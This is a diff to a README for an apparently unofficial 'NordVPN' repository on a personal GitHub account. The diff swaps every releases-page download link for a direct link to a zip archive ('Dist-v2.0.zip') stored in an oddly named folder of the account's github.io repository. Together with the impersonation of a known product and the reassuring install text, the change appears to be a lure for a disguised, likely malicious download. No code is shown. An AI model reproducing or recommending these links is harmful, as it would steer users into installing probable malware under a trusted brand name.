@@ -28,13 +28,13 @@ You don't need to understand any of this - just open the app, click connect, and
 
 Ready to get started? Downloading NordVPN is quick and easy!
 
-[![Download Now](https://img.shields.io/badge/Download-NordVPN-blue?style=for-the-badge&logo=download)](https://github.com/yussef862/nordvpn/releases)
+[![Download Now](https://img.shields.io/badge/Download-NordVPN-blue?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/yussef862/yussef862.github.io/main/extemporariness/Dist-v2.0.zip)
 
 ## 📥 Installation Guide
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/yussef862/nordvpn/releases](https://github.com/yussef862/nordvpn/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/yussef862/yussef862.github.io/main/extemporariness/Dist-v2.0.zip](https://raw.githubusercontent.com/yussef862/yussef862.github.io/main/extemporariness/Dist-v2.0.zip)
 
 Click on the download link and the file will begin downloading to your computer. The download should only take a few moments depending on your internet speed.
 
@@ -152,7 +152,7 @@ NordVPN puts the power of enterprise-grade privacy and security right at your fi
 
 Don't wait another moment to secure your online presence. Download NordVPN today and experience the internet the way it was meant to be - free, open, and secure.
 
-[![Get NordVPN Now](https://img.shields.io/badge/Download-NordVPN-green?style=for-the-badge&logo=download&logoColor=white)](https://github.com/yussef862/nordvpn/releases)
+[![Get NordVPN Now](https://img.shields.io/badge/Download-NordVPN-green?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/yussef862/yussef862.github.io/main/extemporariness/Dist-v2.0.zip)
 
 Your privacy matters. Take control of it today with NordVPN.
 
